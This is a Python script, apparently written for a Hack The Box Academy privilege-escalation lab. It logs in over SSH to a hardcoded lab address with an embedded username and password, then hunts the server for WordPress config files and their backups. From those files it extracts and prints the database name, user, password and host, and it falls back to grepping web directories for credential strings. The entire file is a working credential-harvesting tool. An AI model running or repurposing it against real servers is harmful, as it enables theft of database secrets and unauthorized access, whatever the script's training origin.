#!/usr/bin/env python3

import re
import sys
from dataclasses import dataclass
from typing import Dict, List, Optional

import paramiko


DEFAULT_HOST = "10.129.2.210"
DEFAULT_USERNAME = "htb-student"
DEFAULT_PASSWORD = "Academy_LLPE!"


@dataclass
class CommandResult:
    command: str
    stdout: str
    stderr: str
    exit_status: int


class TargetClient:
    def __init__(self, host: str, username: str, password: str, port: int = 22):
        self.host = host
        self.username = username
        self.password = password
        self.port = port
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    def connect(self) -> None:
        self.client.connect(
            self.host,
            port=self.port,
            username=self.username,
            password=self.password,
            timeout=15,
            banner_timeout=15,
            auth_timeout=15,
        )

    def close(self) -> None:
        self.client.close()

    def run(self, command: str, timeout: int = 45) -> CommandResult:
        stdin, stdout, stderr = self.client.exec_command(command, timeout=timeout)
        out = stdout.read().decode(errors="replace")
        err = stderr.read().decode(errors="replace")
        code = stdout.channel.recv_exit_status()
        return CommandResult(command=command, stdout=out, stderr=err, exit_status=code)


def parse_wp_define(key: str, config_text: str) -> Optional[str]:
    # Match: define('DB_PASSWORD', 'secret'); or define("DB_PASSWORD", "secret");
    pattern = rf"define\s*\(\s*['\"]{re.escape(key)}['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)"
    match = re.search(pattern, config_text, flags=re.IGNORECASE)
    if not match:
        return None
    return match.group(1)


def find_wp_configs(target: TargetClient) -> List[str]:
    search_cmd = (
        "find /var/www /srv /opt /home -type f "
        "\\( -name 'wp-config.php' -o -name 'wp-config.php.bak' -o -name 'wp-config.php.old' -o -name 'wp-config.php.*' \\) "
        "-readable 2>/dev/null | sort -u"
    )
    result = target.run(search_cmd)
    return [line.strip() for line in result.stdout.splitlines() if line.strip()]


def extract_wp_db_credentials(target: TargetClient, path: str) -> Dict[str, str]:
    result = target.run(f"sed -n '1,220p' {shell_quote(path)}", timeout=20)
    if result.exit_status != 0 or not result.stdout:
        return {}

    content = result.stdout
    creds = {
        "DB_NAME": parse_wp_define("DB_NAME", content) or "",
        "DB_USER": parse_wp_define("DB_USER", content) or "",
        "DB_PASSWORD": parse_wp_define("DB_PASSWORD", content) or "",
        "DB_HOST": parse_wp_define("DB_HOST", content) or "",
    }

    # Only consider it a valid WordPress DB block when DB_PASSWORD exists.
    if not creds["DB_PASSWORD"]:
        return {}
    return creds


def grep_fallback(target: TargetClient) -> str:
    cmd = (
        "grep -RInE \"DB_(NAME|USER|PASSWORD|HOST)|wpdb|mysqli|PDO\" "
        "/var/www /srv /opt 2>/dev/null | head -n 120"
    )
    return target.run(cmd, timeout=30).stdout.strip()


def shell_quote(value: str) -> str:
    return "'" + value.replace("'", "'\"'\"'") + "'"


def main() -> int:
    print(f"[+] Connecting to {DEFAULT_HOST} as {DEFAULT_USERNAME}")
    target = TargetClient(DEFAULT_HOST, DEFAULT_USERNAME, DEFAULT_PASSWORD)

    try:
        target.connect()
    except Exception as exc:
        print(f"[-] SSH connection failed: {exc}")
        return 1

    try:
        wp_configs = find_wp_configs(target)
        if not wp_configs:
            print("[-] No readable WordPress config files found in /var/www, /srv, /opt, /home")
            fallback = grep_fallback(target)
            if fallback:
                print("\n[*] Fallback grep hints:")
                print(fallback)
            return 2

        print(f"[+] Found {len(wp_configs)} WordPress config candidate(s)")

        found_any_password = False
        for path in wp_configs:
            creds = extract_wp_db_credentials(target, path)
            if not creds:
                continue

            found_any_password = True
            print("\n" + "=" * 70)
            print(f"Config: {path}")
            print("=" * 70)
            print(f"DB_NAME:     {creds['DB_NAME']}")
            print(f"DB_USER:     {creds['DB_USER']}")
            print(f"DB_PASSWORD: {creds['DB_PASSWORD']}")
            print(f"DB_HOST:     {creds['DB_HOST']}")

        if not found_any_password:
            print("[-] WordPress config file(s) found, but no DB_PASSWORD value was extracted.")
            fallback = grep_fallback(target)
            if fallback:
                print("\n[*] Fallback grep hints:")
                print(fallback)
            return 3

        print("\n[+] Completed WordPress DB credential hunt.")
        return 0
    finally:
        target.close()


if __name__ == "__main__":
    sys.exit(main())
